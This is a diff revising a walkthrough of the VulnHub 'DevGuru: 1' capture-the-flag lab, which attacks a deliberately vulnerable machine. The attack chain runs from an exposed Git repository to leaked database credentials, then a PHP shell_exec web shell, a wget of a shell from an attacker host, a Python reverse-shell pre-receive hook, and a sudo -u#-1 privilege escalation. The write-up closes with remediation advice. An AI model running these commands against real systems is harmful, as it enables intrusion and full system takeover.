@@ -1,150 +1,225 @@
 # DevGuru: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.32 (host-only) |
-| **Hostname** | devguru.local |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.32 |
+| **Difficulty** | Hard |
 | **OS** | Linux |
-| **Flags** | user.txt + root.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/devguru-1,620/) |
+| **Goal** | root flag (`root.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/devguru-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → exposed `.git/` + Gitea:8585 → git-dumper recovers DB creds → October CMS PHP console → reverse shell → Gitea pre-receive hook (Python reverse shell) → sudo sqlite3 CVE (EDB-47502) → root
+DevGuru exposes a Git repository via HTTP that leaks database credentials. Those credentials unlock an October CMS admin panel, where PHP code execution leads to a reverse shell. A backup file reveals Gitea credentials, and a Git hook is abused to pivot laterally. A CVE-2019-14287 sudo bypass (sqlite3 with `-u#-1`) then grants root.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Enumerate exposed `.git/` with GitDumper
-3. Extract credentials from recovered `config/database.php`
-4. Access October CMS and achieve RCE via PHP code console
-5. Pivot through Gitea git hooks for user shell
-6. Escalate via `sudo -u#-1 sqlite3` (CVE-2019-14287 / EDB-47502)
+1. Reconnaissance — Nmap, virtual host setup
+2. Git repository dump and source code analysis
+3. October CMS admin login via database hash replacement
+4. RCE through CMS page snippets and reverse shell
+5. Gitea credential discovery from backup file
+6. Pre-receive Git hook abuse for second shell
+7. Privilege escalation via sudo CVE-2019-14287
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-echo "192.168.1.32 devguru.local" >> /etc/hosts
-nmap -p- -A 192.168.1.32
+nmap -p- -A $TARGET
 ```
 
-Finds: port 80 (Apache, exposes `/.git/`), port 8585 (Gitea).
+![nmap scan](images/01-nmap.png)
 
-![Nmap results](images/01-nmap.png)
+Three ports are open: **22** (SSH), **80** (Apache + October CMS), and **8585** (Gitea).
+
+Add the hostname to `/etc/hosts`:
+
+```
+192.168.1.32 devguru.local
+```
+
+Browsing port 80 shows an October CMS site. The URL `http://devguru.local/.git/` is accessible — the entire Git repository is exposed.
 
 ---
 
 ## Step 2: Git Repository Dump
 
-The web root has a `.git/` directory exposed. Use GitTools to dump and extract:
+Use [GitTools](https://github.com/internetwache/GitTools) to dump and reconstruct the repository:
 
 ```bash
-git clone https://github.com/internetwache/GitTools
-cd GitTools/Dumper
-./gitdumper.sh http://devguru.local/.git/ /tmp/website
-cd ../Extractor
-./extractor.sh /tmp/website /tmp/extracted
+./gitdumper.sh http://devguru.local/.git/ /tmp/devguru-dump
+./extractor.sh /tmp/devguru-dump /tmp/devguru-src
 ```
 
-Search for database credentials in the recovered commit files:
+![git dump](images/02-git-dump.png)
 
-```bash
-grep -r "password" /tmp/extracted/
-# Found in config/database.php:
-# DB: octoberdb | user: october | pass: SQ66EBYx4GT3byXH
+Key file recovered: `config/database.php`
+
+```
+DB_USERNAME=october
+DB_PASSWORD=SQ66EBYx4GT3byXH
+DB_DATABASE=octoberdb
 ```
 
-![GitDumper output](images/02-gitdumper.png)
+Also recovered: `admin.php` — the Adminer database panel path.
 
 ---
 
-## Step 3: October CMS Access and RCE
+## Step 3: October CMS Admin Access
 
-Navigate to `http://devguru.local/backend`. Log in as `frank` after resetting the bcrypt hash in the database:
+Log into MySQL via Adminer at `http://devguru.local/adminer.php`:
+
+- **Server:** localhost
+- **User:** october
+- **Password:** SQ66EBYx4GT3byXH
+- **Database:** octoberdb
+
+In the `backend_users` table, locate the row for user **frank** and replace the bcrypt hash with a new one for a known password:
 
 ```bash
-mysql -u october -p'SQ66EBYx4GT3byXH' octoberdb
-UPDATE backend_users SET password='$2y$10$...' WHERE username='frank';
-# Use hash of 'rajchandel'
+# Generate bcrypt hash for "rajchandel"
+htpasswd -nbB fake rajchandel | cut -d: -f2
 ```
 
-In the CMS, go to **CMS > Pages > Add page**. Add a PHP `onStart()` function:
+![hash replacement](images/03-cms-admin.png)
+
+Now log in at `http://devguru.local/backend` as `frank` / `rajchandel`.
+
+---
+
+## Step 4: RCE via October CMS Page Snippet
+
+Navigate to **CMS > Pages**, create a new page, and add the following PHP snippet:
 
 ```php
 function onStart() {
-    $this->page["output"] = shell_exec($_GET['cmd']);
+    $this->page["myVar"] = shell_exec($_GET['cmd']);
 }
 ```
 
-Add `{{ page.output }}` to the page markup. Browse to `?cmd=id` to verify RCE, then get a shell:
+In the page Twig template, add:
 
-```bash
-# On attacker
-python3 -m http.server 8000
-nc -lvnp 4444
-
-# Via CMS (?cmd=)
-wget http://ATTACKER_IP:8000/shell.php -O /var/www/html/shell.php
-# Browse to devguru.local/shell.php
+```twig
+{{ page.this.myVar }}
 ```
 
-![October CMS RCE via PHP console](images/03-october-cms-shell.png)
+Save and preview the page. Test execution:
+
+```
+http://devguru.local/?cmd=id
+```
+
+![rce test](images/04-rce.png)
+
+Download a PHP reverse shell to the target:
+
+```bash
+# Attacker: serve the shell
+python3 -m http.server 8000
+
+# Via cmd parameter on the CMS page:
+http://devguru.local/?cmd=wget http://$LHOST:8000/shell.php -O /tmp/shell.php
+```
+
+Start a listener and trigger the shell:
+
+```bash
+nc -lvnp $LPORT
+http://devguru.local/?cmd=php /tmp/shell.php
+```
+
+You land as **www-data**.
 
 ---
 
-## Step 4: Gitea Pre-Receive Hook
+## Step 5: Gitea Credential Discovery
 
-Find Gitea backup credentials:
+Search for backup files:
 
 ```bash
 cat /var/backup/app.ini.bak
-# [database] user = gitea  PASSWD = <password>
 ```
 
-Connect to the Gitea MySQL and reset Frank's password, then log in at port 8585. Go to the `frank/devguru-website` repo → **Settings → Git Hooks → pre-receive**. Insert a reverse shell:
+This reveals Gitea database credentials:
 
-```python
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+DB_USER = gitea
+DB_PASSWD = UfFPTF8C8jjxVF2m
 ```
 
-Trigger by committing any change to the repo (e.g., edit README.md). Catch shell on `nc -lvnp 1234`. Read `user.txt`.
+Log into MySQL as the gitea user and replace frank's password hash in the `user` table:
 
-![Gitea pre-receive hook setup](images/04-gitea-hook.png)
+```bash
+mysql -u gitea -pUfFPTF8C8jjxVF2m
+USE gitea;
+UPDATE user SET passwd = '<bcrypt_of_rajchandel>' WHERE name = 'frank';
+```
 
 ---
 
-## Step 5: Privilege Escalation via sudo sqlite3
+## Step 6: Git Hook Abuse (Lateral Movement to frank)
+
+Log into Gitea at `http://devguru.local:8585` as `frank` / `rajchandel`.
+
+Navigate to the `devguru-website` repository and go to **Settings > Git Hooks > pre-receive**. Add a Python reverse shell:
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+Start a listener. Then edit `README.md` through the Gitea web UI and commit. The pre-receive hook fires and returns a shell as **frank**.
+
+```bash
+cat /home/frank/user.txt
+```
+
+---
+
+## Step 7: Privilege Escalation — CVE-2019-14287 (sudo -u#-1)
 
 ```bash
 sudo -l
-# User frank may run: (ALL) NOPASSWD: /usr/bin/sqlite3
-# Vulnerable: sudoers plugin with sudo < 1.8.28 (CVE-2019-14287 / EDB-47502)
-
-sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
-# root shell obtained
-cat /root/root.txt
 ```
 
-![Root flag](images/05-root.png)
+Output shows:
+
+```
+(ALL, !root) NOPASSWD: /usr/bin/sqlite3
+```
+
+The sudo version is older than 1.8.28 — CVE-2019-14287 applies. The sudo policy `!root` can be bypassed by specifying UID `-1`, which maps to root (UID 0):
+
+```bash
+sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
+```
+
+![root flag](images/05-root-flag.png)
+
+```bash
+cat /root/root.txt
+```
 
 ---
 
 ## Lessons Learned
 
-1. **Exposed `.git/` directories** leak full source code including config files with DB credentials — always block access to `.git/` in web server config
-2. **CMS code execution panels** (October CMS, etc.) are effectively RCE endpoints if login is compromised — restrict admin access and disable dev tools in production
-3. **Gitea git hooks** run as the Gitea process user — never allow untrusted users to modify hooks on a server
-4. **CVE-2019-14287**: `sudo -u#-1` bypasses UID restrictions in sudo < 1.8.28; upgrade sudo and audit sudoers entries
+- Exposed `.git/` directories leak full source code including credentials.
+- CMS admin panels with PHP snippet support provide direct RCE.
+- Backup files stored outside the web root still expose credentials if the server user can read them.
+- Git server hook abuse is an underrated lateral movement vector.
+- CVE-2019-14287 bypasses `!root` sudo policies on unpatched sudo.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Exposed `.git/` | Add `<Directory .git> Deny from all </Directory>` in Apache or `location /.git { deny all; }` in Nginx |
-| CMS DB creds in config | Use environment variables or a secrets manager; rotate credentials |
-| Gitea hook modification | Restrict who can push to repos with hooks; run Gitea as a limited user |
-| sudo CVE-2019-14287 | Upgrade sudo ≥ 1.8.28; use `!root` syntax in sudoers if needed |
+| Exposed `.git/` directory | Block access to `/.git/` in web server config (`Deny from all`) |
+| Hardcoded DB credentials in source | Use environment variables and secrets managers |
+| CMS allows PHP execution in templates | Restrict snippet permissions; sandbox PHP execution |
+| World-readable backup files | Store backups outside the web/app directory with restricted permissions |
+| CVE-2019-14287 (sudo < 1.8.28) | Upgrade sudo to 1.8.28 or later |
+| Git hook execution on push | Audit server-side hooks; restrict Gitea admin access |
